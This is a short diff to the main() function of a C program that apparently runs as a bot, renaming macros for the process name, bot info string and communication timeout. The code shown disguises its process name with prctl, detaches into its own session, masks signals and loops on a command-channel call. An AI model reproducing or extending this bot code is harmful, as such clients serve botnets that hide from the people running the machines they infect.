@@ -17,7 +17,7 @@ int main(void)
     printd("comm_init ok")
 
 #ifndef DEBUG
-    prctl(PR_SET_NAME, PROC_NAME, 0, 0, 0); // Change the process name
+    prctl(PR_SET_NAME, MAIN_NAME, 0, 0, 0); // Change the process name
 
     pid_t pid, sid; /* Our process ID and Session ID */
 
@@ -50,7 +50,7 @@ int main(void)
     sigprocmask(SIG_SETMASK, &mask, NULL);
 
     // Put some info about the bot in the ELF file for people to read
-    char *info = BOTINFO;
+    char *info = MAIN_BOTINFO;
 #endif /* DEBUG */
 
     printd("Starting!")
@@ -58,6 +58,6 @@ int main(void)
     {
 		if (comm_comm() == false)
 		    exit(1);
-		sleep(TIMEOUT);
+		sleep(COMM_TIMEOUT);
     }
 }
